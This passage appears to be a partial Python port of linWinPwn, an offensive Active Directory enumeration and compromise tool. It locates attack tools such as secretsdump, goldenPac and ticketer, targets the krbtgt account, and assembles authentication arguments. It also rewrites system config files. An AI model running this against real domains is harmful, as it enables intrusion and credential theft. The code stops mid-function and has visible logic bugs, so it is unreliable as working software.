#!/usr/bin/env python3
import subprocess
import shlex
import os
import sys
import datetime
import shutil
import re
import json
from typing import List, Union
import time
import requests
import random
import string
import hashlib
import base64
import glob
import ipaddress
import socket
import argparse
import urllib3
import logging
import tempfile
import platform
import getpass
import uuid
import xml.etree.ElementTree as ET
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# Colors
RED = '\033[1;31m'
GREEN = '\033[1;32m'
CYAN = '\033[1;36m'
BLUE = '\033[1;34m'
YELLOW = '\033[1;33m'
PURPLE = '\033[1;35m'
NC = '\033[0m'

# Default variables
dc_port_135 = 135
cd_port_445 = 445  # It might be a typo: should be dc_port_445, I'll fix that below
gethash_user = "krbtgt"
dc_port_445 = 445
dc_port_389 = 389
dc_port_636 = 636
dc_port_88 = 88
dc_port_3389 = 3389
dc_port_5985 = 5985
user = ""
password = ""
interactive_bool = True
output_dir = os.getcwd()
wordlists_dir = "/opt/lwp-wordlists"
pass_wordlist = "/usr/share/wordlists/rockyou.txt"
if not os.path.isfile(pass_wordlist):
    pass_wordlist = f"{wordlists_dir}/rockyou.txt"
user_wordlist = "/usr/share/seclists/Usernames/cirt-default-usernames.txt"
if not os.path.isfile(user_wordlist):
    user_wordlist = f"{wordlists_dir}/cirt-default-usernames.txt"
attacker_interface = "eth0"
attacker_IP = ""  # Will be set in prepare()
curr_targets = "Domain Controllers"
# Custom target variables
custom_servers = ""
custom_ip = ""
cert_bool = False
targets = "DC"
custom_target_scanned = False
nullsess_bool = False
pass_bool = False
hash_bool = False
kerb_bool = False
aeskey_bool = False
cert_bool = False
autoconfig_bool = False
ldaps_bool = False
ldapbinding_bool = False
forcekerb_bool = False
verbose_bool = False
domain = None

# Tools variables (These will be populated by which command)
scripts_dir = "/opt/lwp-scripts"
netexec = ""
impacket_findDelegation = ""
impacket_GetUserSPNs = ""
impacket_secretsdump = ""
impacket_GetNPUsers = ""
impacket_getTGT = ""
impacket_goldenPac = ""
impacket_rpcdump = ""
impacket_reg = ""
impacket_smbserver = ""
impacket_ticketer = ""
impacket_ticketconverter = ""
impacket_getST = ""
impacket_raiseChild = ""
impacket_smbclient = ""
impacket_smbexec = ""
impacket_wmiexec = ""
impacket_psexec = ""
impacket_changepasswd = ""
impacket_mssqlclient = ""
impacket_describeticket = ""
enum4linux_py = ""
bloodhound = ""
bloodhoundce = ""
ldapdomaindump = ""
smbmap = ""
adidnsdump = ""
certi_py = ""
certipy = ""
ldeep = ""
pre2k = ""
certsync = ""
hekatomb = ""
manspider = ""
coercer = ""
donpapi = ""
bloodyad = ""
mssqlrelay = ""
kerbrute = ""
silenthound = ""
windapsearch = ""
CVE202233679 = ""
targetedKerberoast = ""
FindUncommonShares = ""
ExtractBitlockerKeys = ""
ldapconsole = ""
pyLDAPmonitor = ""
LDAPWordlistHarvester = ""
rdwatool = ""
aced = ""
sccmhunter = ""
ldapper = ""
orpheus = ""
krbjack = ""
adalanche = ""
pygpoabuse = ""
GPOwned = ""
privexchange = ""
RunFinger = ""
LDAPNightmare = ""
ADCheck = ""
adPEAS = ""
breads = ""
smbclientng = ""
evilwinrm = ""
ldapnomnom = ""
godap = ""
mssqlpwner = ""
aesKrbKeyGen = ""
soapy = ""
nmap = ""
john = "/root/tools/john/run/john"  # Hardcoded in original script
python3 = ""

def which(program: str) -> str:
    """
    Mimics the 'which' command with PATH lookup fallback.
    """
    def is_exe(fpath):
        return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

    fpath, _ = os.path.split(program)
    if fpath:
        if is_exe(program):
            return program
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = os.path.join(path, program)
            if is_exe(exe_file):
                return exe_file

    # Fallback if not in PATH, look into scripts_dir and some defaults
    alt_locations = [scripts_dir, '/usr/share/wordlists', '/usr/share/seclists/Usernames'] # add your default search locations
    for location in alt_locations:
        alt_program = os.path.join(location, program)
        if is_exe(alt_program):
            return alt_program
    return ""

def find_impacket_tool(tool_name: str) -> str:
    """
    Find impacket tool with standard name and impacket- prefix
    """
    tool_path = which(tool_name)
    if not tool_path:
      tool_path = which(f"impacket-{tool_name}")
    return tool_path

def populate_tools_paths():
    """
    Populates the global variables holding the tools paths.
    """
    global netexec, impacket_findDelegation, impacket_GetUserSPNs, \
           impacket_secretsdump, impacket_GetNPUsers, impacket_getTGT, \
           impacket_goldenPac, impacket_rpcdump, impacket_reg, \
           impacket_smbserver, impacket_ticketer, impacket_ticketconverter, \
           impacket_getST, impacket_raiseChild, impacket_smbclient, \
           impacket_smbexec, impacket_wmiexec, impacket_psexec, \
           impacket_changepasswd, impacket_mssqlclient, impacket_describeticket, \
           enum4linux_py, bloodhound, bloodhoundce, ldapdomaindump, smbmap, \
           adidnsdump, certi_py, certipy, ldeep, pre2k, certsync, hekatomb, \
           manspider, coercer, donpapi, bloodyad, mssqlrelay, kerbrute, \
           silenthound, windapsearch, CVE202233679, targetedKerberoast, \
           FindUncommonShares, ExtractBitlockerKeys, ldapconsole, \
           pyLDAPmonitor, LDAPWordlistHarvester, rdwatool, aced, sccmhunter, \
           ldapper, orpheus, krbjack, adalanche, pygpoabuse, GPOwned, \
           privexchange, RunFinger, LDAPNightmare, ADCheck, adPEAS, breads, \
           smbclientng, evilwinrm, ldapnomnom, godap, mssqlpwner, \
           aesKrbKeyGen, soapy, nmap, python3

    netexec = which("netexec")
    impacket_findDelegation = find_impacket_tool("findDelegation.py")
    impacket_GetUserSPNs = find_impacket_tool("GetUserSPNs.py")
    impacket_secretsdump = find_impacket_tool("secretsdump.py")
    impacket_GetNPUsers = find_impacket_tool("GetNPUsers.py")
    impacket_getTGT = find_impacket_tool("getTGT.py")
    impacket_goldenPac = find_impacket_tool("goldenPac.py")
    impacket_rpcdump = find_impacket_tool("rpcdump.py")
    impacket_reg = find_impacket_tool("reg.py")
    impacket_smbserver = find_impacket_tool("smbserver.py")
    impacket_ticketer = find_impacket_tool("ticketer.py")
    impacket_ticketconverter = find_impacket_tool("ticketConverter.py")
    impacket_getST = find_impacket_tool("getST.py")
    impacket_raiseChild = find_impacket_tool("raiseChild.py")
    impacket_smbclient = find_impacket_tool("smbclient.py")
    if not impacket_smbclient:
        impacket_smbclient = find_impacket_tool("smbexec.py") #Fall back to smbexec
    impacket_smbexec = find_impacket_tool("smbexec.py")
    impacket_wmiexec = find_impacket_tool("wmiexec.py")
    impacket_psexec = find_impacket_tool("psexec.py")
    impacket_changepasswd = find_impacket_tool("changepasswd.py")
    impacket_mssqlclient = find_impacket_tool("mssqlclient.py")
    impacket_describeticket = find_impacket_tool("describeTicket.py")
    enum4linux_py = which("enum4linux-ng")
    if not enum4linux_py:
        enum4linux_py = os.path.join(scripts_dir, "enum4linux-ng.py")
    bloodhound = which("bloodhound-python")
    bloodhoundce = which("bloodhound-python_ce")
    ldapdomaindump = which("ldapdomaindump")
    smbmap = which("smbmap")
    adidnsdump = which("adidnsdump")
    certi_py = which("certi.py")
    certipy = which("certipy")
    ldeep = which("ldeep")
    pre2k = which("pre2k")
    certsync = which("certsync")
    hekatomb = which("hekatomb")
    manspider = which("manspider")
    coercer = which("coercer")
    donpapi = which("DonPAPI")
    bloodyad = which("bloodyAD")
    mssqlrelay = which("mssqlrelay")
    kerbrute = os.path.join(scripts_dir, "kerbrute")
    silenthound = os.path.join(scripts_dir, "silenthound.py")
    windapsearch = os.path.join(scripts_dir, "windapsearch")
    CVE202233679 = os.path.join(scripts_dir, "CVE-2022-33679.py")
    targetedKerberoast = os.path.join(scripts_dir, "targetedKerberoast.py")
    FindUncommonShares = os.path.join(scripts_dir, "FindUncommonShares.py")
    ExtractBitlockerKeys = os.path.join(scripts_dir, "ExtractBitlockerKeys.py")
    ldapconsole = os.path.join(scripts_dir, "ldapconsole.py")
    pyLDAPmonitor = os.path.join(scripts_dir, "pyLDAPmonitor.py")
    LDAPWordlistHarvester = os.path.join(scripts_dir, "LDAPWordlistHarvester.py")
    rdwatool = which("rdwatool")
    aced = os.path.join(scripts_dir, "aced-main", "aced.py")
    sccmhunter = os.path.join(scripts_dir, "sccmhunter-main", "sccmhunter.py")
    ldapper = os.path.join(scripts_dir, "ldapper", "ldapper.py")
    orpheus = os.path.join(scripts_dir, "orpheus-main", "orpheus.py")
    krbjack = which("krbjack")
    adalanche = os.path.join(scripts_dir, "adalanche")
    pygpoabuse = os.path.join(scripts_dir, "pyGPOAbuse-master", "pygpoabuse.py")
    GPOwned = os.path.join(scripts_dir, "GPOwned.py")
    privexchange = os.path.join(scripts_dir, "privexchange.py")
    RunFinger = os.path.join(scripts_dir, "Responder", "RunFinger.py")
    LDAPNightmare = os.path.join(scripts_dir, "CVE-2024-49113-checker.py")
    ADCheck = which("adcheck")
    adPEAS = which("adPEAS")
    breads = which("breads-ad")
    smbclientng = which("smbclientng")
    evilwinrm = which("evil-winrm")
    ldapnomnom = os.path.join(scripts_dir, "ldapnomnom")
    godap = os.path.join(scripts_dir, "godap")
    mssqlpwner = which("mssqlpwner")
    aesKrbKeyGen = os.path.join(scripts_dir, "aesKrbKeyGen.py")
    soapy = which("soapy")
    nmap = which("nmap")
    python3 = os.path.join(scripts_dir, ".venv", "bin", "python3")
    if not os.path.isfile(python3):
      python3 = which("python3")

def print_banner():
    print(f"""
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      {BLUE}linWinPwn: {CYAN}version 1.0.32 {NC}
      https://github.com/lefayjey/linWinPwn
      {BLUE}Author: {CYAN}lefayjey{NC}
      {BLUE}Inspired by: {CYAN}S3cur3Th1sSh1t's WinPwn{NC}
""")

def help_linWinPwn():
    print_banner()
    print(f"{YELLOW}Parameters{NC}")
    print("-h/--help           Show the help message")
    print(f"-t/--target         IP Address of Target Domain Controller {RED}[MANDATORY]{NC}")
    print("-d/--domain         Domain of user (default: empty)")
    print("-u/--username       Username (default: empty)")
    print("-p                  Password (NTLM authentication only) (default: empty)")
    print("-H                  LM:NT (NTLM authentication only) (default: empty)")
    print("-K                  Location to Kerberos ticket './krb5cc_ticket' (Kerberos authentication only) (default: empty)")
    print("-A                  AES Key (Kerberos authentication only) (default: empty)")
    print("-C                  Location to PFX Certificate './cert.pfx' (default: empty)")
    print("--cert-pass         Password of provided PFX Certificate (optional)")
    print("--auto              Run automatic enumeration")
    print("-o/--output         Output directory (default: current dir)")
    print("--auto-config       Run NTP sync with target DC and adds entry to /etc/hosts")
    print("--ldaps             Use LDAPS instead of LDAP (port 636)")
    print("--ldap-binding      Use LDAP Channel Binding on LDAPS (port 636)")
    print("--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)")
    print("--verbose           Enable all verbose and debug outputs")
    print(f"-I/--interface      Attacker's network interface (default: {attacker_interface})")
    print("-T/--targets        Target systems for Vuln Scan, SMB Scan and Pwd Dump (default: Domain Controllers)")
    print(f"     {CYAN}Choose between:{NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)")
    print("-U/--userwordlist   Custom username list used during Null session checks")
    print("-P/--passwordlist   Custom password list used during password cracking")
    print("")
    print(f"{YELLOW}Example usages{NC}")
    print(f"{os.getcwd()}/{os.path.basename(__file__)} -t dc_ip {CYAN}(No password for anonymous login){NC}")
    print(f"{os.getcwd()}/{os.path.basename(__file__)} -t dc_ip -d domain -u user [-p password or -H hash or -K kerbticket]")
    print("")

def run_command(command: str) -> str:
    """
    Runs a shell command using subprocess, logs it, and optionally prints it verbosely.
    """
    with open(command_log, "a") as log_file:
        log_file.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}; {command}\n")

    if verbose_bool:
        print(f"{CYAN}[i] Running command: {command}{NC}")
    print(f"{CYAN}[i] Running command: {command}{NC}")

    # Use script command to capture output similar to the original bash script
    process = subprocess.run(['script', '-qc', command, '/dev/null'], capture_output=True, text=True)
    return process.stdout

def ntp_update():
    """
    Syncs time with the target DC.
    """
    print("")
    subprocess.run(['sudo', 'timedatectl', 'set-ntp', '0'], check=True)
    subprocess.run(['sudo', 'ntpdate', dc_ip], check=True)
    print(f"{GREEN}[+] NTP sync complete{NC}")

def etc_hosts_update():
    """
    Adds the target DC's IP and domain to /etc/hosts.
    """
    print("")
    if not check_file_for_string("/etc/hosts", dc_ip):
        hosts_bak = os.path.join(output_dir, "Config", f"hosts.{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.backup")
        subprocess.run(['sudo', 'cp', '/etc/hosts', hosts_bak], check=True)
        print(f"{YELLOW}[i] Backup file of /etc/hosts created: {hosts_bak}{NC}")

        # Remove existing linWinPwn entries, handles multiple possible formats
        subprocess.run(f"sudo sed -i '/linWinPwn/,+3d' /etc/hosts", shell=True, check=False) # Deletes linWinPwn and next 3 lines if present
        subprocess.run(f"sudo sed -i '/{dc_FQDN}/d' /etc/hosts", shell=True, check=False)  # removes any line with dc_FQDN

        with open("/etc/hosts", "a") as f:
            f.write("# /etc/hosts entry added by linWinPwn\n")
            f.write(f"{dc_ip}\t{dc_domain} {dc_FQDN} {dc_NETBIOS}\n")

        subprocess.run(['sudo', 'sh', '-c', f'echo "# /etc/hosts entry added by linWinPwn" >> /etc/hosts'])
        subprocess.run(['sudo', 'sh', '-c', f'echo "{dc_ip} {dc_domain} {dc_FQDN} {dc_NETBIOS}" >> /etc/hosts'])
        print(f"{GREEN}[+] Hosts file update complete{NC}")
    else:
        print(f"{PURPLE}[-] Target IP already present in /etc/hosts... {NC}")

def etc_resolv_update():
    """
    Adds the target DC's IP to /etc/resolv.conf as nameserver.
    """
    print("")
    if not check_file_for_string("/etc/resolv.conf", dc_ip):
        resolv_bak = os.path.join(output_dir, "Config", f"resolv.conf.{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.backup")
        shutil.copy2('/etc/resolv.conf', resolv_bak)
        print(f"{YELLOW}[i] Backup file of /etc/resolv.conf created: {resolv_bak}{NC}")

        with open('/etc/resolv.conf', 'r') as f:
            original_content = f.read()
        
        new_content = f"# /etc/resolv.conf entry added by linWinPwn\nnameserver {dc_ip}\n{original_content}"
        
        with open('/etc/resolv.conf', 'w') as f:
            f.write(new_content)
        print(f"{GREEN}[+] DNS resolv config update complete{NC}")
    else:
        print(f"{PURPLE}[-] Target IP already present in /etc/resolv.conf... {NC}")

def etc_krb5conf_update():
    """
    Updates the /etc/krb5.conf file with the domain and KDC information.
    """
    print("")
    if not check_file_for_string("/etc/krb5.conf", dc_domain):
        krb5_bak = os.path.join(output_dir, "Config", f"krb5.conf.{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.backup")
        shutil.copy2('/etc/krb5.conf', krb5_bak)
        print(f"{YELLOW}[i] Backup file of /etc/krb5.conf created: {krb5_bak}{NC}")
        print(f"{YELLOW}[i] Modifying file /etc/krb5.conf${NC}")

        with open("/etc/krb5.conf", "w") as f:
            f.write("# /etc/krb5.conf file modified by linWinPwn\n")
            f.write("[libdefaults]\n")
            f.write(f"        default_realm = {domain.upper()}\n")
            f.write("\n")
            f.write("# The following krb5.conf variables are only for MIT Kerberos.\n")
            f.write("        kdc_timesync = 1\n")
            f.write("        ccache_type = 4\n")
            f.write("        forwardable = true\n")
            f.write("        proxiable = true\n")
            f.write("        rdns = false\n")
            f.write("\n")
            f.write("        fcc-mit-ticketflags = true\n")
            f.write("        dns_canonicalize_hostname = false\n")
            f.write("        dns_lookup_realm = false\n")
            f.write("        dns_lookup_kdc = true\n")
            f.write("        k5login_authoritative = false\n")
            f.write("\n")
            f.write("[realms]\n")
            f.write(f"        {domain.upper()} = {{\n")
            f.write(f"                kdc = {dc_FQDN}\n")
            f.write("        }\n")
            f.write("\n")
            f.write("[domain_realm]\n")
            f.write(f"        .{domain.lower()} = {domain.upper()}\n")
        print(f"{GREEN}[+] KRB5 config update complete{NC}")
    else:
        print(f"{PURPLE}[-] Domain already present in /etc/krb5.conf... {NC}")

def check_file_for_string(filepath: str, search_string: str) -> bool:
    """
    Helper function to check if a string exists in a file.
    """
    try:
        with open(filepath, 'r') as f:
            return any(search_string in line for line in f)
    except Exception as e:
        print(f"Error opening file {filepath}: {str(e)}")
        exit(1)

def prepare():
    """
    Performs initial checks, sets up variables, and configures the environment.
    """
    global domain, dc_ip, user, pass_bool, hash_bool, kerb_bool, aeskey_bool, cert_bool, \
           output_dir, command_log, servers_ip_list, dc_ip_list, sql_ip_list, \
           servers_hostname_list, dc_hostname_list, sql_hostname_list, \
           custom_servers_list, target, target_servers, target_dc, target_sql, \
           dc_NETBIOS, dc_domain, dc_FQDN, user_out, attacker_IP
    
    # Populate tools at beginning of prepare
    populate_tools_paths()

    # Validate DC IP address
    if not dc_ip:
        print(f"{RED}[-] Missing target... {NC}")
        if domain:
            dig_ip = subprocess.getoutput(f"dig +short {domain}")
            if dig_ip:
                print(f"{YELLOW}[i]{NC} Provided domain resolves to {dig_ip}! Try again with {YELLOW}-t {dig_ip}{NC}")
        print(f"{YELLOW}[i]{NC} Use -h for more help")
        sys.exit(1)
    elif not re.match(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", dc_ip):
        print(f"{RED}[-] Target is not an IP address... {NC}")
        dig_ip = subprocess.getoutput(f"dig +short {dc_ip}")
        if dig_ip:
            print(f"{YELLOW}[i]{NC} Provided target resolves to {dig_ip}! Try again with {YELLOW}-t {dig_ip}{NC}")

        if domain:
            dig_ip = subprocess.getoutput(f"dig +short {domain}")
            if dig_ip:
                print(f"{YELLOW}[i]{NC} Provided domain resolves to {dig_ip}! Try again with {YELLOW}-t {dig_ip}{NC}")
        print(f"{YELLOW}[i]{NC} Use -h for more help")
        sys.exit(1)

    print(f"{GREEN}[+] {datetime.datetime.now()}{NC}")

    # Check netexec availability and get DC info
    if not netexec:
        print(f"{RED}[-] Please ensure netexec is installed and try again... {NC}")
        sys.exit(1)
    else:
        dc_info = subprocess.getoutput(f"{netexec} ldap {dc_ip} | grep -v 'Connection refused'")

    # Extract DC information
    dc_NETBIOS = re.sub(r'.*\((name:)([^)]+)\).*', r'\2', dc_info).split('\n')[0].strip()
    dc_domain = re.sub(r'.*\((domain:)([^)]+)\).*', r'\2', dc_info).split('\n')[0].strip()

    # Validate and set FQDN
    if not dc_info:
        print(f"{RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... {NC}")
        sys.exit(1)
    elif not dc_domain:
        print(f"{RED}[-] Error finding DC's domain, please specify domain... {NC}")
        sys.exit(1)
    else:
        # Set domain if not provided
        if not domain:
            domain = dc_domain
        
        # Sanitize dc_domain to remove any wildcard/invalid characters
        dc_domain = dc_domain.replace('*', '').strip()
        
        # Set FQDN based on NETBIOS and domain
        if dc_NETBIOS == dc_domain:
            dc_FQDN = dc_NETBIOS
            dc_NETBIOS = dc_FQDN.split('.')[0]
        else:
            dc_FQDN = f"{dc_NETBIOS}.{dc_domain}"

    # Set user output name
    if not user:
        user_out = "null"
    else:
        user_out = user.replace(" ", "").strip()

    # Setup directory structure and file paths
    output_dir = os.path.join(output_dir, f"linWinPwn_{dc_domain}_{user_out}")
    command_log = os.path.join(output_dir, f"{datetime.datetime.now().strftime('%Y-%m-%d')}_command.log")
    
    # Define output file paths
    servers_ip_list = os.path.join(output_dir, "DomainRecon", "Servers", f"ip_list_{dc_domain}.txt")
    dc_ip_list = os.path.join(output_dir, "DomainRecon", "Servers", f"dc_ip_list_{dc_domain}.txt")
    sql_ip_list = os.path.join(output_dir, "DomainRecon", "Servers", f"sql_ip_list_{dc_domain}.txt")
    servers_hostname_list = os.path.join(output_dir, "DomainRecon", "Servers", f"servers_list_{dc_domain}.txt")
    dc_hostname_list = os.path.join(output_dir, "DomainRecon", "Servers", f"dc_list_{dc_domain}.txt")
    sql_hostname_list = os.path.join(output_dir, "DomainRecon", "Servers", f"sql_list_{dc_domain}.txt")
    custom_servers_list = os.path.join(output_dir, "DomainRecon", "Servers", f"custom_servers_list_{dc_domain}.txt")
    
    # Set target variables
    target = dc_ip
    target_servers = servers_ip_list
    target_dc = dc_ip_list
    target_sql = sql_ip_list

    # Create necessary directories
    os.makedirs(os.path.join(output_dir, "Credentials"), exist_ok=True)
    os.makedirs(os.path.join(output_dir, "DomainRecon", "Servers"), exist_ok=True)
    os.makedirs(os.path.join(output_dir, "DomainRecon", "Users"), exist_ok=True)
    os.makedirs(os.path.join(output_dir, "Scans"), exist_ok=True)

    # Scan DC ports
    dc_open_ports = subprocess.getoutput(
        f"{nmap} -n -Pn -p 135,445,389,636,88,3389,5985 {dc_ip} -sT -T5 --open -oG {os.path.join(output_dir, 'Scans', f'{dc_ip}_mainports')}"
    )

    # Set port status indicators
    dc_port_135 = GREEN + "open" + NC if "135/tcp" in dc_open_ports else RED + "filtered|closed" + NC
    dc_port_445 = GREEN + "open" + NC if "445/tcp" in dc_open_ports else RED + "filtered|closed" + NC
    dc_port_389 = GREEN + "open" + NC if "389/tcp" in dc_open_ports else RED + "filtered|closed" + NC
    dc_port_636 = GREEN + "open" + NC if "636/tcp" in dc_open_ports else RED + "filtered|closed" + NC
    dc_port_88 = GREEN + "open" + NC if "88/tcp" in dc_open_ports else RED + "filtered|closed" + NC
    dc_port_3389 = GREEN + "open" + NC if "3389/tcp" in dc_open_ports else RED + "filtered|closed" + NC
    dc_port_5985 = GREEN + "open" + NC if "5985/tcp" in dc_open_ports else RED + "filtered|closed" + NC

    # Run auto-configuration if enabled
    if autoconfig_bool:
        print(f"{BLUE}[*] Running auto-config... {NC}")
        os.makedirs(os.path.join(output_dir, "Config"), exist_ok=True)
        ntp_update()
        etc_hosts_update()
        etc_resolv_update()
        etc_krb5conf_update()

    # Ensure list files exist
    for file_path in [servers_ip_list, servers_hostname_list, dc_ip_list, dc_hostname_list]:
        if not os.path.exists(file_path):
            open(file_path, 'a').close()

    # Check for wordlist files
    if not os.path.isfile(user_wordlist):
        print(f"{RED}[-] Users list file not found{NC}")
    if not os.path.isfile(pass_wordlist):
        print(f"{RED}[-] Passwords list file not found{NC}")

    print("")

    # Process target selection
    if targets == "DC":
        curr_targets = "Domain Controllers"
    elif targets == "All":
        dns_enum()
        curr_targets = "All domain servers"
    elif targets.startswith("File="):
        curr_targets = "File containing list of servers"
        custom_servers = targets.split("=", 1)[1]
        try:
            shutil.copyfile(custom_servers, custom_servers_list)
        except Exception as e:
            print(f"{RED}Invalid servers list: {str(e)}.{NC} Choosing Domain Controllers as targets instead.")
            curr_targets = "Domain Controllers"
            custom_servers = ""

        if not os.path.exists(custom_servers_list) or not os.path.getsize(custom_servers_list) > 0:
            print(f"{RED}Invalid servers list.{NC} Choosing Domain Controllers as targets instead.")
            curr_targets = "Domain Controllers"
            custom_servers = ""
    elif targets.startswith("IP="):
        curr_targets = "IP or hostname"
        custom_ip = targets.split("=", 1)[1].strip()
        with open(custom_servers_list, "w") as f:
            f.write(custom_ip)
        if not os.path.getsize(custom_servers_list) > 0:
            print(f"{RED}Invalid servers list.{NC} Choosing Domain Controllers as targets instead.")
            curr_targets = "Domain Controllers"
            custom_ip = ""
    else:
        print(f"{RED}[-] Error invalid targets parameter. Choose between DC, All, File='./custom_list' or IP=IP_or_hostname... {NC}")
        sys.exit(1)
        
    # Get attacker IP address
    attacker_IP = subprocess.getoutput(f"ip -f inet addr show {attacker_interface} | sed -En -e 's/.*inet ([0-9.]+).*/\\1/p'")

def authenticate():
    """
    Handles authentication logic based on provided credentials.
    """
    global nullsess_bool, argument_ne, argument_smbmap, argument_manspider, \
           argument_coercer, argument_bloodyad, argument_privexchange, argument_windap, \
           argument_adidns, argument_ldd, argument_silenthd, argument_enum4linux, \
           argument_imp, argument_imp_gp, argument_ldeep, argument_pre2k, \
           argument_p0dalirius, argument_FindUncom, argument_adalanche, argument_godap, \
           auth_string, argument_imp_ti, argument_bhd, argument_certi_py, \
           argument_certipy, argument_certsync, argument_donpapi, argument_hekatomb, \
           argument_targkerb, argument_aced, argument_sccm, argument_ldapper, \
           argument_mssqlrelay, argument_pygpoabuse, argument_GPOwned, \
           argument_adpeas, argument_adcheck, argument_evilwinrm, argument_mssqlpwner, \
           argument_soapy, hash_bool, kerb_bool, aeskey_bool, cert_bool, forcekerb_bool, target, \
           target_dc, target_sql, target_servers, ne_verbose, argument_CVE202233679, \
           argument_kerbrute, mssqlrelay_verbose, adalanche_verbose, verbose_bool
    
    pass_bool = False
    hash_bool = False
    kerb_bool = False
    aeskey_bool = False
    cert_bool = False
    # Check if null session or empty password is used
    if not (pass_bool or hash_bool or kerb_bool or aeskey_bool or cert_bool):
        if user:
            print(f"{RED}[i]{NC} Please specify password, NTLM hash, Kerberos ticket, AES key or certificate and try again...")
            sys.exit(1)
        else:
            nullsess_bool = True
            global rand_user
            rand_user = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
            argument_ne = "-d {} -u '' -p ''".format(domain)
            argument_smbmap = "-d {} -u '' -p ''".format(domain)
            argument_manspider = "-d {} -u '' -p ''".format(domain)
            argument_coercer = "-d {} -u '' -p ''".format(domain)
            argument_bloodyad = "-d {} -u '' -p ''".format(domain)
            argument_privexchange = "-d {} -u '' -p ''".format(domain)
            argument_windap = f"-d {domain}"
            argument_adidns = ""
            argument_ldd = ""
            argument_silenthd = ""
            argument_enum4linux = ""
            argument_imp = f"{domain}/"
            argument_imp_gp = f"{domain}/"
            argument_ldeep = f"-d {dc_domain} -a"
            argument_pre2k = f"-d {domain}"
            argument_p0dalirius = f"-d {domain} -u Guest -p ''"
            argument_FindUncom = f"-ad {domain} -au Guest -ap ''"
            argument_adalanche = f"--authmode anonymous --username Guest\\@{domain} -p '!'"
            argument_godap = ""
            auth_string = f"{YELLOW}[i]{NC} Authentication method: {YELLOW}null session {NC}"

    # Check if username is not provided
    elif not user:
        print(f"{RED}[i]{NC} Please specify username and try again...")
        sys.exit(1)

    # Check if password is used
    if pass_bool:
        argument_ne = f"-d {domain} -u '{user}' -p '{password}'"
        argument_imp = f"{domain}/'{user}':'{password}'"
        argument_imp_gp = f"{domain}/'{user}':'{password}'"
        argument_imp_ti = f"-user '{user}' -password '{password}' -domain {domain}"
        argument_bhd = f"-u '{user}'\\@{domain} -p '{password}' --auth-method ntlm"
        argument_enum4linux = f"-w {domain} -u '{user}' -p '{password}'"
        argument_adidns = f"-u {domain}\\\\'{user}' -p '{password}'"
        argument_ldd = f"-u {domain}\\\\'{user}' -p '{password}'"
        argument_smbmap = f"-d {domain} -u '{user}' -p '{password}'"
        argument_certi_py = f"{domain}/'{user}':'{password}'"
        argument_certipy = f"-u '{user}'\\@{domain} -p '{password}'"
        argument_ldeep = f"-d {domain} -u '{user}' -p '{password}'"
        argument_pre2k = f"-d {domain} -u '{user}' -p '{password}'"
        argument_certsync = f"-d {domain} -u '{user}' -p '{password}'"
        argument_donpapi = f"-d {domain} -u '{user}' -p '{password}'"
        argument_hekatomb = f"{domain}/'{user}':'{password}'"
        argument_silenthd = f"-u {domain}\\\\'{user}' -p '{password}'"
        argument_windap = f"-d {domain} -u '{user}' -p '{password}'"
        argument_targkerb = f"-d {domain} -u '{user}' -p '{password}'"
        argument_p0dalirius = f"-d {domain} -u '{user}' -p '{password}'"
        argument_FindUncom = f"-ad {domain} -au '{user}' -ap '{password}'"
        argument_manspider = f"-d {domain} -u '{user}' -p '{password}'"
        argument_coercer = f"-d {domain} -u '{user}' -p '{password}'"
        argument_bloodyad = f"-d {domain} -u '{user}' -p '{password}'"
        argument_aced = f"{domain}/'{user}':'{password}'"
        argument_sccm = f"-d {domain} -u '{user}' -p '{password}'"
        argument_ldapper = f"-D {domain} -U '{user}' -P '{password}'"
        argument_adalanche = f"--authmode ntlm --username '{user}'\\@{domain} --password '{password}'"
        argument_mssqlrelay = f"-u '{user}'\\@{domain} -p '{password}'"
        argument_pygpoabuse = f"{domain}/'{user}':'{password}''"
        argument_GPOwned = f"-d {domain} -u '{user}' -p '{password}'"
        argument_privexchange = f"-d {domain} -u '{user}' -p '{password}'"
        argument_adpeas = f"-d {domain} -u '{user}' -p '{password}'"
        argument_adcheck = f"-d {domain} -u '{user}' -p '{password}'"
        argument_evilwinrm = f"-u '{user}' -p '{password}'"
        argument_godap = f"-u '{user}'@{domain} -p '{password}'"
        argument_mssqlpwner = f"{domain}/'{user}':'{password}'"
        argument_soapy = f"{domain}/'{user}':'{password}'"
        hash_bool = False
        kerb_bool = False
        os.environ.pop('KRB5CCNAME', None)  # Unset KRB5CCNAME
        aeskey_bool = False
        cert_bool = False
        auth_string = f"{YELLOW}[i]{NC} Authentication method: {YELLOW}password of {user}{NC}"

    # Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT
    if hash_bool or cert_bool:
        if cert_bool:
            print(f"{YELLOW}[!] WARNING only ldeep and bloodyAD currently support certificate authentication.{NC}")
            print(f"{YELLOW}[!] Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools{NC}")
            pkinit_auth()
            openssl_cmd = f'{which("openssl")} pkcs12 -in "{pfxcert}" -out "{output_dir}/Credentials/{user}.pem" -nodes -passin pass:""'
            subprocess.run(shlex.split(openssl_cmd), check=True)
            pem_cert = os.path.join(output_dir, "Credentials", f"{user}.pem")
            if os.path.isfile(pem_cert):
                print(f"{GREEN}[+] PFX Certificate converted to PEM successfully:{NC} '{pem_cert}'")
            argument_bloodyad = f"-d {domain} -u '{user}' -c ':{pem_cert}'"
            argument_ldeep = f"-d {domain} -u '{user}' --pfx-file '{pfxcert}'"
            argument_evilwinrm = f"-u '{user}' -k '{pem_cert}'"
